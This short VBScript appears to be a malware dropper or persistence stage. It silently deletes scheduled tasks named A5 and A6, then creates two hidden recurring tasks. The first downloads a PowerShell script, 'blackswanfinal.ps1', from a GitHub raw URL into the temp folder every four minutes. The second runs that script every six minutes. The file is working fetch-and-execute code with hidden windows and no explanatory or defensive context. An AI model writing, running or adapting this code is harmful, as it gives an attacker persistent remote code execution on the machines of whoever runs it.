Set s2 = CreateObject("WScript.Shell")
s2.Run ("schtasks /Delete /tn ""A5"" /F"), 0, True

Set s3 = CreateObject("WScript.Shell")
s3.Run ("schtasks /Delete /tn ""A6"" /F"), 0, True


Set s4 = CreateObject("WScript.Shell")

s4.Run ("schtasks.exe /create /sc minute /mo 4 /tn ""donesoon"" /tr ""curl https://raw.githubusercontent.com/section10housing/b1/master/blackswanfinal.ps1 -o %tmp%\blkfinal.ps1"""), 0, False

Set s5 = CreateObject("WScript.Shell")

s5.Run ("schtasks.exe /create /sc minute /mo 6 /tn ""donefinal"" /tr ""powershell -file %tmp%\blkfinal.ps1"""), 0, False




